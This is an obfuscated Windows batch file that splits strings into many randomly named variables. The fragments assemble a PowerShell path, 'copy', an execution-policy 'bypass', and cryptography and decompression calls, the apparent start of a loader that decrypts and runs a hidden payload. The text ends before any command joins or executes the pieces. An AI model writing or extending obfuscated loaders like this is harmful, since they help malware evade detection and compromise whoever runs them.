@echo off
set "eRSnZtJeJl=do"
set "yNCxGKUrql=\v"
set "rDSZoKZOvl=nd"
set "oztfhiBunj=y "
set "rnbFZScxHJ=he"
set "afDZDjsHpL=0\"
set "txMilskDTx=rs"
set "BhGZyKCSGx=in"
set "EpmAZohkOv=Wi"
set "pjLHrPUlIJ=.e"
set "MWqYJMeKjO=ll"
set "mHtUcCiiXR=po"
set "ihPVuMcMEr=st"
set "YHoOJnjLYQ=Sy"
set "nofwilirTK=em"
set "GLSsEGxHoP=we"
set "QRnzVIbSfr=ow"
set "VJlAjKhxlB=Po"
set "ROxKmjDyQI=32"
set "mlThEyLDrm=ll"
set "sFoAzmmvTX=xe"
set "vlPUjXkLgB=rS"
set "zwrKmVfoQj=1."
set "TgLqZgRcja= C"
set "nfuAgDTlrL=s\"
set "KMfGAjqBMK=py"
set "yqUojfqyft=\W"
set "jDWVTWuRmc=ws"
set "MxBmWwgNyz= /"
set "zobSPPUiVI=we"
set "pLFECuFsep=he"
set "RLfvrIUxAM=co"
set "QcKmBiWkgl=:\"
set "AhlfieEWht=cd"
set "SNkPkdfbQI= %~dp0"
set "SPWJCylBIX=tsWi"
set "hSUEFfrwMX=ptog"
set "XsLYJTdysd=PKCS"
set "UxNOiBUZvZ=n ''"
set "QXdYCzvSyI=bstr"
set "ACnoUYMJmc=ck($"
set "RdfrUXKNND=ct S"
set "rpJsgeumjG=embl"
set "eqxQluwqCh=ment"
set "HGawhGrlwF=.Cop"
set "CLARKKhfTu=bypa"
set "FJqdaHhGhm=nirt"
set "yayucVSmiC=$tJr"
set "umjcvTwVKD=('Tg"
set "HAWUVfxmyV=TXaa"
set "MUqFuziIQs=join"
set "UZRCzfJROs=K) {"
set "hIwBDWWdJx= = N"
set "CARhjpIBAi=J = "
set "yhzvmwgEoL=e = "
set "MPFvMDkFTU=tion"
set "TzfmKyOaPv=[Env"
set "oGLbXPCVmw=  $r"
set "TNoFMugUlQ=Obje"
set "cDvLaaGron=3); "
set "muiWXzRhjx=pres"
set "vSyjZyRpaY=;$tJ"
set "dnNhtsMkzY=BC;$"
set "rCCEvNhkTH=bjec"
set "RepWEDJITp=ypto"
set "tOXcViVsXo=wK ="
set "RiMpspMvaI=yste"
set "nJuFmjjZUN=ose("
set "wqYxsVIPXz=saBm"
set "KAkyIOGULL=e]::"
set "OcKzwiMFMK=zZt "
set "BlYLnzUhdL=KIfw"
set "mScfOibYsa=HTXa"
